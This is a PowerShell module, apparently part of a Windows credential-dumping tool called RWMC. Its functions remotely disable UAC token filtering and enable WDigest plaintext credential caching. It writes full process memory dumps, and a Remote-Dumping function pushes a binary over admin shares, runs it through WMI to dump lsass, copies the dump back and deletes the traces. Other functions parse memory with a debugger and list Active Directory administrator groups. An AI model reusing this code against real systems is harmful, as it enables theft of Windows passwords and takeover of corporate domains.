function Set-RegistryKey($computername, $parentKey, $nameRegistryKey, $valueRegistryKey) {
    try{    
        $remoteBaseKeyObject = [microsoft.win32.registrykey]::OpenRemoteBaseKey('LocalMachine',$computername)     
        $regKey = $remoteBaseKeyObject.OpenSubKey($parentKey,$true)
        $regKey.Setvalue("$nameRegistryKey", "$valueRegistryKey", [Microsoft.Win32.RegistryValueKind]::DWORD) 
        $remoteBaseKeyObject.close()
    }
    catch {
        $_.Exception
    }
}

function Disable-UAC($computername) {
    $parentKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
    $nameRegistryKey = "LocalAccountTokenFilterPolicy"
    $valueRegistryKey = "1"

    $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $computername)
    $objRegKey= $objReg.OpenSubKey($parentKey)
    $test = $objRegkey.GetValue($nameRegistryKey)
    if($test -eq $null){    
        Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
        Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        if($test -ne 1){
            Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function CreateDirectoryIfNeeded ( [string] $directory ) {
	if (!(Test-Path -Path $directory -type "Container")) {
		New-Item -type directory -Path $directory > $null
	}
}

function Set-SymbolServer {              
    $cacheDirectory = "c:\SYMBOLS\PUBLIC"     
    $refSrcPath = "$cacheDirectory*http://referencesource.microsoft.com/symbols"
    $msdlPath = "$cacheDirectory*http://msdl.microsoft.com/download/symbols"    
    $envPath = "SRV*$refSrcPath;SRV*$msdlPath"    
    CreateDirectoryIfNeeded -directory $cacheDirectory
    $env:_NT_SYMBOL_PATH = $envPath    
}

function Write-Minidump ($process, $dumpFilePath) {
    $windowsErrorReporting = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $windowsErrorReportingNativeMethods = $windowsErrorReporting.GetNestedType('NativeMethods', 'NonPublic')
    $flags = [Reflection.BindingFlags] 'NonPublic, Static'
    $miniDumpWriteDump = $windowsErrorReportingNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
    $miniDumpWithFullMemory = [UInt32] 2

    $processId = $process.Id
    $processName = $process.Name
    $processHandle = $process.Handle
    $processFileName = "$($processName).dmp"

    $processDumpPath = "$dumpFilePath\$processFileName"

    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
    try{
    $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
    }
    catch{
        $_.Exception()
    }

    $fileStream.Close()       
}

function Run-WmiRemoteProcess {
    Param(
        [string]$computername=$env:COMPUTERNAME,
        [string]$cmd=$(Throw "You must enter the full path to the command which will create the process."),
        [int]$timeout = 0
    )
 
    Write-Host "Process to create on $computername is $cmd"
    [wmiclass]$wmi="\\$computername\root\cimv2:win32_process"
    # Exit if the object didn't get created
    if (!$wmi) {return}
 
    try{
    $remote=$wmi.Create($cmd)
    }
    catch{
        $_.Exception
    }
    $test =$remote.returnvalue
    if ($remote.returnvalue -eq 0) {
        Write-Host ("Successfully launched $cmd on $computername with a process id of " + $remote.processid)
    } else {
        Write-Host ("Failed to launch $cmd on $computername. ReturnValue is " + $remote.ReturnValue)
    }    
    return
}

function Remote-Dumping($computername, $scriptPath, $logDirectoryPath) {
    Copy-Item -Path "$scriptPath\msdsc.exe" -Destination "\\$computername\c$\windows\temp\msdsc.exe"
    $dumpAProcessPath = "C:\Windows\temp\msdsc.exe"
    Run-WmiRemoteProcess $computername "$dumpAProcessPath lsass c:\windows\temp" | Wait-Process
    Start-Sleep -Seconds 15
    Copy-Item -Path "\\$computername\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath"
    Remove-Item -Force "\\$computername\c$\windows\temp\msdsc.exe"
    Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"        
    Write-Progress -Activity "msdsc log created" -status "Running..." -id 1
}

function Set-WdigestProvider {
    $parentKey = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
    $nameRegistryKey = "UseLogonCredential"
    $valueRegistryKey = "1"
    if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){                  
        New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null            
        Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        $valueSetted = (Get-ItemProperty -Path  $parentKey  -Name $nameRegistryKey).$nameRegistryKey
        if($valueSetted -ne 1) {
            New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null
            Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function Set-RemoteWdigestProvider ($server) {
    $parentKey = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
    $nameRegistryKey = "UseLogonCredential"
    $valueRegistryKey = "1"
    $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $server)
    $objRegKey= $objReg.OpenSubKey($parentKey)
    $test = $objRegkey.GetValue($nameRegistryKey)
    if($test -eq $null){    
        Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
        Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        if($test -ne 1){
            Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function Write-InFile ($buffer, $chain) {
    [io.file]::WriteAllText($buffer, $chain) | Out-Null
}

function Call-MemoryWalker ($memoryWalker, $file, $fullScriptPath) {
    $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" 
    return $tab
}

function Clean-String ($tab, $matches) {
    $chain = White-Rabbit42
    $tabA = ($tab -split ' ')     
    if($mode -eq 132) { 
        $start = 20
        $fi = [array]::indexof($tabA,$chain) + 7
        $foundT = $tabA[$fi]      
        $found = "$foundT"   
    }   
    else {
        $fi = [array]::indexof($tabA,$chain) + 10
        $found1 = $tabA[$fi]    
        $fi = [array]::indexof($tabA,$chain) + 11
        $found2 = $tabA[$fi]    
        $found = "$found2$found1"   
    }
    return $found
}

function Stop-Script () {   
    Begin{
        Write-Log -streamWriter $global:streamWriter -infoToLog "--- Script terminating ---"
    }
    Process{        
        "Script terminating..." 
        Write-Host "================================================================================================"
        End-Log -streamWriter $global:streamWriter       
        Exit
    }
}

function Test-InternetConnection {
    if(![Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet){
        Write-Host "The script need an Internet Connection to run" -f Red    
        Stop-Script
    }
}

function Test-LocalAdminRights {
    $myComputer = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
    $myUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $amIAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent())
    $adminFlag = $amIAdmin.IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if($adminFlag -eq $true){
        $adminMessage = " with administrator rights on " 
    }
    else {
        $adminMessage = " without administrator rights on "
    }

    Write-Host "RWMC runs with user " -nonewline; Write-Host $myUser.Name -f Red -nonewline; Write-Host $adminMessage -nonewline; Write-Host $myComputer -f Red -nonewline; Write-Host " computer"
    return $adminFlag
}

function Set-ActiveDirectoryInformations ($adFlag) {
    if (((gwmi win32_computersystem).partofdomain -eq $true) -and ($adFlag -eq 1)) {
        $partOfADomain = 1
        Import-Module activedirectory 
        if (Get-Module -ListAvailable -Name activedirectory) {
            Import-Module activedirectory
        } else {
            Write-Host "Module activedirectory does not exist, importing..."
            Import-Module ServerManager 
            Add-WindowsFeature RSAT-AD-PowerShell        
        }    
        $enterpriseAdminsGroup = "Enterprise Admins"
        $schemaAdminsGroup = "Schema Admins"
        $domainAdminsGroup = "Domain Admins"
        $administratorsGroup = " Administrators"
        $backupOperatorsGroup = "Backup Operators"    
        $enterpriseAdmins = ""
        $schemaAdmins = ""
        $domainAdmins = ""
        $administrators = ""
        $backupOperators = ""
        try {$enterpriseAdmins = (Get-ADGroupMember $enterpriseAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$schemaAdmins = (Get-ADGroupMember $schemaAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$domainAdmins = (Get-ADGroupMember $domainAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$administrators = (Get-ADGroupMember $administratorsGroup -Recursive).DistinguishedName}catch{}
        try {$backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}      
    }
}